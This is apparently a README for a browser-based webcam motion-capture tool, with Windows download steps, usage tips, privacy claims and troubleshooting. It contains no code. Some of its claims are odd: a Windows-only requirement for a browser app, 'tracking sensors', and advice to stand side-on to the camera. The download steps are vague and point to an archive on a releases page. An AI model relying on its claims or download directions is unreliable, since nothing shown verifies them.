## 📌 Overview

LiteRT.js-Mocap tracks human movement accurately using your web browser. This tool detects body positions in real time through your computer camera. You do not need expensive hardware or complex software installations. The program processes all data on your machine to keep your video feed private.

## 🛠️ System Requirements

Ensure your computer meets these standards for smooth performance:

*   **Operating System:** Windows 10 or Windows 11.
*   **Web Browser:** Google Chrome, Microsoft Edge, or Brave.
*   **Camera:** A standard USB webcam or an integrated laptop camera.
*   **Processor:** An Intel Core i5 or equivalent processor.
*   **Memory:** At least 8GB of RAM.
*   **Graphics:** A dedicated graphics card helps but integrated graphics perform well for basic tasks.

## 📥 How to Get Started

Follow these steps to set up the application on your Windows computer.

1.  Visit the [official releases page](https://github.com/Frayagronomist166/LiteRT.js-Mocap/releases) to access the software files.
2.  Look for the latest release version at the top of the list.
3.  Click the link labeled with your system type to trigger the download.
4.  Once the folder finishes downloading, right-click the file and select Extract All.
5.  Open the extracted folder and locate the file named index.html.
6.  Double-click the index.html file to open the interface in your default web browser.

## ⚙️ Using the Interface

Once you open the software in your web browser, follow these steps to begin tracking:

1.  Grant camera permission when your browser request appears at the top left of the screen.
2.  Position yourself a few feet away from your camera.
3.  Ensure your room has decent lighting so the software detects your limbs clearly.
4.  The application will draw a skeleton overlay on your live video feed immediately.
5.  Use the settings panel on the right side of the screen to adjust tracking sensitivity if the movement feels jittery.

## 💡 Tips for Best Results

*   **Lighting:** Strong light sources behind you create silhouettes that confuse the tracking sensors. Place your lights in front of you.
*   **Clothing:** Wear clothing that contrasts with your background. If your walls are white, wear dark colors.
*   **Connectivity:** This software runs locally on your machine. You do not need a constant internet connection to use the tracking features after the initial load.
*   **Browser Tabs:** Close other demanding applications or browser tabs if you notice the video feed lagging. This frees up memory for the motion tracking engine.

## 🛡️ Privacy and Data

Your privacy remains a priority. This application performs all calculations inside your web browser. No video data leaves your computer or uploads to an external server. Once you close your browser tab, the camera connection terminates and the temporary tracking data clears from your system memory.

## 🔧 Troubleshooting

If you encounter issues, look through these common solutions:

*   **Black Screen:** Refresh your browser page. If the issue persists, check that no other software is currently using your webcam.
*   **Slow Performance:** Lower the resolution settings within the application menu. Lower resolutions require less computing power.
*   **No Detection:** Check if your camera lens is clean and unobstructed. Ensure your entire body remains within the camera frame.
*   **Browser Compatibility:** Update your browser to the latest version. Older software sometimes lacks the acceleration features needed for smooth motion tracking.

## 📈 Improving Accuracy

The software uses advanced machine learning models to identify joint points on your body. Occasional misidentification occurs if you wear baggy clothing or perform extremely rapid movements. Moving at a steady pace helps the software maintain contact with your joints. The software works best when the user stands perpendicular to the camera rather than facing directly toward it or away from it.
